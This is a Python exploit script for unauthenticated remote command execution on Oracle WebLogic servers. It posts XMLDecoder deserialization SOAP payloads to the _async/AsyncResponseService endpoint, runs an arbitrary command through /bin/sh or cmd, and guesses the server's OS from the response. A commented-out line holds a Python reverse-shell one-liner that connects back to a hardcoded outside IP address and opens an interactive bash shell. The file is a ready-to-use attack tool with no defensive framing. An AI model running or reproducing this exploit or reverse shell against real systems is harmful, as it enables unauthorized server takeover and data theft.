import optparse
import requests
import base64

#proxies = {"http":"http://127.0.0.1:8080"}
headers = {'Content-type': 'text/xml'}
uri = '/wls-wsat/CoordinatorPortType'
linux_poc = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
     <soapenv:Header>
        <wsa:Action>demoAction</wsa:Action>
        <wsa:RelatesTo>hello</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.8" class="java.beans.xmlDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/sh</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>%s</string>
</void>
</array>
<void method="start"/>
</void>
</java>
</work:WorkContext>
     </soapenv:Header>
     <soapenv:Body>
        <asy:onAsyncDelivery/>
     </soapenv:Body>
</soapenv:Envelope>
'''
win_poc = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
     <soapenv:Header>
        <wsa:Action>demoAction</wsa:Action>
        <wsa:RelatesTo>hello</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.8" class="java.beans.xmlDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>cmd</string>
</void>
<void index="1">
<string>/c</string>
</void>
<void index="2">
<string>%s</string>
</void>
</array>
<void method="start"/>
</void>
</java>
</work:WorkContext>
     </soapenv:Header>
     <soapenv:Body>
        <asy:onAsyncDelivery/>
     </soapenv:Body>
</soapenv:Envelope>
'''

def exp(url,timeout,cmd):
    # cmd = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("39.105.128.57",4321));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' '''
    # print cmd
    base64cmd=base64.b64encode(cmd.encode('utf-8'))
    linux_poccmd = 'echo %s|base64 -d|bash' % base64cmd
    linux_poc2 = linux_poc % linux_poccmd
    win_poc2 = win_poc % cmd
    url2 = url.rstrip('/')+'/_async/AsyncResponseService'
    try:
        r1 = requests.post(url2,headers=headers,data=linux_poc2,timeout=timeout)
        r2 = requests.post(url2,headers=headers,data=win_poc2,timeout=timeout)
        if r1.status_code == 202 or r2.status_code == 202:
            print 'ok!'
            if r1.status_code == 202:
                print 'Linux OS'
            else:
                print 'Win OS'
    except requests.ReadTimeout:
        print u'Read timeout'
    # except requests.Connectionerror:
    #     print u'Connect error'
    except Exception,e:
        print '\tOops\t'+repr(e).split('(')[0]

if __name__ == '__main__':
    parser = optparse.OptionParser('python %prog ' + '-h (manual)', version='%prog v1.0')
    parser.add_option('-u', dest='tgtUrl', type='string', help='single url')
    parser.add_option('-s', dest='timeout', type='int', default=7, help='timeout(seconds)')
    parser.add_option('-c', dest='cmd', type='string', default='whoami', help='execute command')
    (options, args) = parser.parse_args()
    # check = options.check

    command = options.cmd
    timeout = options.timeout
    tgtUrl = options.tgtUrl
    exp(tgtUrl,timeout,command)